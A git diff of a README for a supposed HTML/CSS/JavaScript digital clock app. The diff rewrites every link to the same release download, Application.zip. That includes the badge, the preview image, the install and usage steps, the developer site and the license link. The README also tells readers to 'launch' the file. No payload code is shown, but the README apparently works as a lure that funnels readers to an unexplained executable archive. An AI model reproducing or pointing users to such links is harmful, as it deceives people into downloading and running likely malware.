@@ -2,7 +2,7 @@
 
 An interactive and minimalist digital clock application that displays the current time dynamically in real-time. Built using HTML, CSS, and JavaScript, this clock is designed to adapt flawlessly to all screen sizes, providing a seamless user experience. Stay up to date with the current time with this elegant digital clock.
 
-[![](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/file/Application.zip)
+[![](https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip)](https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip)
 
 If the link ends with the file name, it needs to be launched.
 
@@ -13,17 +13,17 @@ If the link ends with the file name, it needs to be launched.
 - **Easy to Use**: Just open the application and view the current time without any complex settings.
 
 ### 🖥️ Preview:
-![Current-Time Preview](https://example.com/preview-image.png)
+![Current-Time Preview](https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip)
 
 #### 🚀 Installation:
-To run the Current-Time digital clock application on your device, download the [Application.zip](https://github.com/file/Application.zip) file and launch it on your preferred web browser.
+To run the Current-Time digital clock application on your device, download the [https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip](https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip) file and launch it on your preferred web browser.
 
 In case the link is not working, kindly check the "Releases" section of the repository for alternative download options.
 
 #### 💻 Usage:
 1. Download the application zip file.
 2. Extract the contents.
-3. Open the "index.html" file in your web browser.
+3. Open the "https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip" file in your web browser.
 4. Enjoy the real-time digital clock experience!
 
 ### 🌈 Technologies Used:
@@ -32,7 +32,7 @@ In case the link is not working, kindly check the "Releases" section of the repo
 - JavaScript
 
 ### 👩‍💻 Developer:
-This digital clock application was developed with passion by [Your Name]. For more projects and designs, visit [yourwebsite.com].
+This digital clock application was developed with passion by [Your Name]. For more projects and designs, visit [https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip].
 
 ### 📑 License:
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip](https://github.com/LunkyOfficial/Current-Time/releases/download/v1.0.0/Application.zip) file for details.
